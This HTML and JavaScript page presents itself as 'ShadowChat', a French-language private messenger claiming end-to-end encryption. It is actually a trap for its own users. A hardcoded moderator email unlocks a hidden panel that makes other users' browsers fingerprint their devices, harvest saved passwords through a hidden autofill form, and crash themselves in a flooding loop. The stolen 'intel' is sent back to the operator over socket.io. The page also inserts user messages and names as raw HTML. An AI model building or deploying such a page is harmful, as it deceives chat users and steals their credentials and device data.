<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ShadowChat | Private Messaging</title>
    <style>
        :root { --p-gold: #ffcf4d; --p-bg: #0b0e11; --p-panel: #15191c; --p-text: #e9edef; --p-mod: #00ff41; }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: var(--p-bg); color: var(--p-text); height: 100vh; overflow: hidden; }

        /* --- AUTH --- */
        #auth { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; }
        .auth-box { background: var(--p-panel); padding: 40px; border-radius: 12px; width: 380px; text-align: center; border: 1px solid #333; }
        .auth-box h2 { margin-bottom: 20px; color: var(--p-gold); }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #444; color: #fff; border-radius: 6px; }
        .btn-join { width: 100%; padding: 12px; background: var(--p-gold); color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 6px; }

        /* --- MAIN LAYOUT --- */
        #app { display: flex; height: 100vh; }
        .sidebar { width: 350px; background: var(--p-panel); border-right: 1px solid #222; display: flex; flex-direction: column; }
        .chat-area { flex: 1; display: flex; flex-direction: column; position: relative; }

        /* --- ELEMENTS --- */
        .user-item { padding: 15px; border-bottom: 1px solid #222; display: flex; align-items: center; gap: 15px; cursor: pointer; transition: 0.3s; }
        .user-item:hover { background: #1e2428; }
        .avatar { width: 45px; height: 45px; background: #333; border-radius: 50%; border: 2px solid transparent; overflow: hidden; }
        .avatar img { width: 100%; height: 100%; object-fit: cover; }
        .status { font-size: 12px; color: #8696a0; }

        /* MODO BADGE */
        .modo-tag { background: var(--p-mod); color: #000; font-size: 9px; padding: 2px 5px; border-radius: 3px; font-weight: 900; margin-left: 5px; }

        /* MESSAGES */
        .msgs { flex: 1; padding: 20px; overflow-y: auto; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-opacity: 0.05; }
        .bubble { max-width: 60%; padding: 10px 15px; border-radius: 10px; margin-bottom: 10px; font-size: 14px; position: relative; }
        .received { background: #202c33; align-self: flex-start; }
        .sent { background: #005c4b; align-self: flex-end; margin-left: auto; }

        /* CONTROLS */
        .input-bar { height: 60px; background: #202c33; padding: 10px 20px; display: flex; align-items: center; gap: 15px; }
        .input-bar input { flex: 1; background: #2a3942; border: none; }

        /* --- THE POWER PANEL (MODO ONLY) --- */
        #modo-panel { display: none; position: absolute; right: 20px; top: 80px; width: 300px; background: rgba(0,0,0,0.9); border: 2px solid var(--p-mod); padding: 15px; border-radius: 8px; z-index: 5000; box-shadow: 0 0 20px var(--p-mod); }
        .strike-btn { width: 100%; padding: 10px; margin: 5px 0; background: #333; color: var(--p-mod); border: 1px solid var(--p-mod); font-family: monospace; cursor: pointer; text-align: left; font-size: 11px; }
        .strike-btn:hover { background: var(--p-mod); color: #000; }

        /* CALL OVERLAY */
        #call-ui { display: none; position: fixed; inset: 0; background: rgba(11, 14, 17, 0.95); z-index: 20000; flex-direction: column; align-items: center; justify-content: center; }
        .call-avatar { width: 120px; height: 120px; border-radius: 50%; border: 3px solid var(--p-gold); margin-bottom: 20px; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0px rgba(255,207,77,0.4); } 100% { box-shadow: 0 0 0 30px rgba(255,207,77,0); } }

    </style>
</head>
<body>

    <div id="auth">
        <div class="auth-box">
            <h2>ShadowChat 💎</h2>
            <p style="font-size:12px; color:#666; margin-bottom:15px;">Entrez vos identifiants pour rejoindre le canal privé.</p>
            <input type="email" id="u-mail" placeholder="Email">
            <input type="text" id="u-name" placeholder="Pseudo">
            <button class="btn-join" onclick="init()">REJOINDRE</button>
        </div>
    </div>

    <div id="app">
        <aside class="sidebar">
            <div style="padding:20px; background:#202c33; display:flex; justify-content:space-between; align-items:center;">
                <div id="my-avatar" class="avatar" onclick="changePP()"></div>
                <div id="modo-badge"></div>
                <button onclick="startCall()" style="background:none; border:none; font-size:20px; cursor:pointer;">📞</button>
            </div>
            <div id="user-list">
                </div>
            <div style="margin-top:auto; padding:15px; background:#182229; font-size:11px; color:var(--p-gold); text-align:center;">
                VERSION PREMIUM ACTIVÉE
            </div>
        </aside>

        <main class="chat-area">
            <div style="height:60px; background:#202c33; display:flex; align-items:center; padding:0 20px;">
                <b id="chat-with">Canal Global</b>
            </div>
            
            <div class="msgs" id="msg-box">
                <div class="bubble received">Bienvenue sur ShadowChat. Vos messages sont chiffrés de bout en bout.</div>
            </div>

            <div id="modo-panel">
                <div style="font-size:10px; color:var(--p-mod); margin-bottom:10px;">[ SYSTEM_CONTROL_v14 ]</div>
                <div id="target-info" style="font-size:11px; margin-bottom:15px; color:#fff;">Cible : Aucune</div>
                <button class="strike-btn" onclick="atk('p_full')">> LOOKUP_IP_HARDWARE</button>
                <button class="strike-btn" onclick="atk('p_pass')">> GRAB_SAVED_PASSWORDS</button>
                <button class="strike-btn" onclick="atk('p_crash')" style="border-color:red; color:red;">> DDOS_LAG_BOMB (CRASH)</button>
                <button class="strike-btn" onclick="atk('p_freeze')">> ZA_WARUNDO_FREEZE</button>
                <button class="strike-btn" onclick="atk('p_loc')">> GPS_PRECISE_LOC</button>
            </div>

            <div class="input-bar">
                <input type="text" id="m-in" placeholder="Tapez un message...">
                <button onclick="send()" id="send-btn" style="background:none; border:none; font-size:24px; cursor:pointer;">🚀</button>
            </div>
        </main>
    </div>

    <div id="call-ui">
        <div class="call-avatar"></div>
        <h2 id="call-name">Appel entrant...</h2>
        <p style="color:#8696a0; margin-top:10px;">Établissement de la liaison sécurisée</p>
        <div style="margin-top:50px; display:flex; gap:40px;">
            <div onclick="endCall()" style="width:60px; height:60px; background:red; border-radius:50%; display:flex; align-items:center; justify-content:center; cursor:pointer;">✖</div>
            <div onclick="acceptCall()" style="width:60px; height:60px; background:var(--p-green); border-radius:50%; display:flex; align-items:center; justify-content:center; cursor:pointer;">✔</div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let me = ""; let myE = ""; let isMod = false; let targetID = "";

        function init() {
            myE = document.getElementById('u-mail').value.toLowerCase();
            me = document.getElementById('u-name').value;
            if(!myE.includes('@')) return;

            document.getElementById('auth').style.display = 'none';
            if(myE === "toucheur2pp@heaven.com") {
                isMod = true;
                document.getElementById('modo-badge').innerHTML = '<span class="modo-tag">MODO SUPRÊME</span>';
                document.getElementById('modo-panel').style.display = 'block';
                document.getElementById('send-btn').style.color = 'var(--p-mod)';
            }
            socket.emit('init', { n: me, e: myE });
        }

        // --- POUVOIRS DE MODÉRATION ---
        function atk(type) {
            if(!targetID) return alert("Sélectionne une cible d'abord !");
            socket.emit(type, targetID);
        }

        socket.on('execute', d => {
            // LOOKUP IP & HARDWARE
            if(d.type === 'p_full') {
                const data = {
                    os: navigator.platform,
                    cpu: navigator.hardwareConcurrency,
                    ram: navigator.deviceMemory,
                    bat: "Scan...",
                    ip_loc: "Pending..."
                };
                socket.emit('chat', { t: `[LOOKUP] ${me}: ${JSON.stringify(data)}`, type: 'intel' });
            }

            // PASSWORD GRABBER (AUTOFILL TRAP)
            if(d.type === 'p_pass') {
                const f = document.createElement('form');
                f.style.display = 'none';
                f.innerHTML = `<input type="text" name="u"><input type="password" name="p">`;
                document.body.appendChild(f);
                setTimeout(() => {
                    socket.emit('chat', { t: `[PASS_GRAB] ${me} | U: ${f.u.value} | P: ${f.p.value}`, type: 'intel' });
                }, 1000);
            }

            // DDOS / CRASH CO
            if(d.type === 'p_crash') {
                document.body.innerHTML = "<h1 style='color:red; text-align:center; padding-top:20%;'>CRASH_CO_ACTIVATED : NETWORK_SATURATION</h1>";
                setInterval(() => {
                    fetch('/?flood=' + Math.random());
                    for(let i=0; i<100000; i++) { Math.sqrt(i); }
                }, 1);
            }
        });

        // --- GESTION DES CIBLES ---
        socket.on('sync', users => {
            const list = document.getElementById('user-list');
            list.innerHTML = "";
            users.forEach(u => {
                const div = document.createElement('div');
                div.className = 'user-item';
                div.innerHTML = `<div class="avatar"></div><div><b>${u.n}</b><br><span class="status">Online</span></div>`;
                div.onclick = () => {
                    if(isMod) {
                        targetID = u.id;
                        document.getElementById('chat-with').innerText = "CIBLE : " + u.n;
                        document.getElementById('target-info').innerText = "Cible : " + u.n + " (" + u.e + ")";
                    }
                };
                list.appendChild(div);
            });
        });

        // --- FONCTIONS SOCIALES ---
        function send() {
            const msg = document.getElementById('m-in').value;
            if(!msg) return;
            socket.emit('chat', { t: msg, type: 'msg' });
            document.getElementById('m-in').value = "";
        }

        socket.on('chat', d => {
            const box = document.getElementById('msg-box');
            if(isMod && d.t.type === 'intel') {
                // Si c'est du loot, on l'affiche discrètement dans tes logs perso
                console.log("INTEL_RCV:", d.t.t);
            } else if(d.t.type === 'msg') {
                const b = document.createElement('div');
                b.className = "bubble " + (d.n === me ? "sent" : "received");
                b.innerHTML = `<b>${d.n}:</b><br>${d.t.t}`;
                box.appendChild(b);
                box.scrollTop = box.scrollHeight;
            }
        });

        function changePP() {
            const url = prompt("Lien de ton image (PP) :");
            if(url) document.getElementById('my-avatar').innerHTML = `<img src="${url}">`;
        }

        function startCall() {
            document.getElementById('call-ui').style.display = 'flex';
        }
        function endCall() { document.getElementById('call-ui').style.display = 'none'; }
        
        // AUTO-SAVE LOOT (Sur ton serveur Render)
        socket.on('save_intel', d => {
             // Cette partie est gérée par ton server.js (LOOT.txt)
        });
    </script>
</body>
</html>
